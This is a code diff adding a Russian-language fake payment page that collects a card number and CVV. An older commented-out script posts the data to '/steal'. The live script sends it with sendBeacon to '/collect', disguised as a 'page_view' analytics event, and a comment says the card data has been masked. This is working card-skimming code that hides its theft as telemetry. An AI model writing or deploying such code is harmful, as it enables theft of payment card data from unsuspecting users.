@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Псевдо-платёж</title>
+</head>
+<body>
+<h1>Введите данные карты</h1>
+<form id="cardForm">
+    <input name="card" placeholder="Номер карты" required><br>
+    <input name="cvv" placeholder="CVV" required><br>
+    <button type="submit">Купить</button>
+</form>
+
+<!--<script>
+    document.getElementById("cardForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const data = {
+            card: e.target.card.value,
+            cvv: e.target.cvv.value
+        };
+        await fetch("/steal", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+        alert("Данные отправлены!");
+    });
+</script>-->
+<script>
+    document.getElementById("cardForm").addEventListener("submit", (e) => {
+        e.preventDefault();
+        const data = {
+            card: e.target.card.value,
+            cvv: e.target.cvv.value
+        };
+
+        // Маскируем под "аналитику"
+        const blob = new Blob([JSON.stringify({
+            event: "page_view",
+            user_agent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            payment_attempt: data // 👈 замаскировали данные карты
+        })], { type: 'application/json' });
+
+        navigator.sendBeacon("/collect", blob);
+
+        alert("Данные отправлены!");
+    });
+</script>
+</body>
+</html>
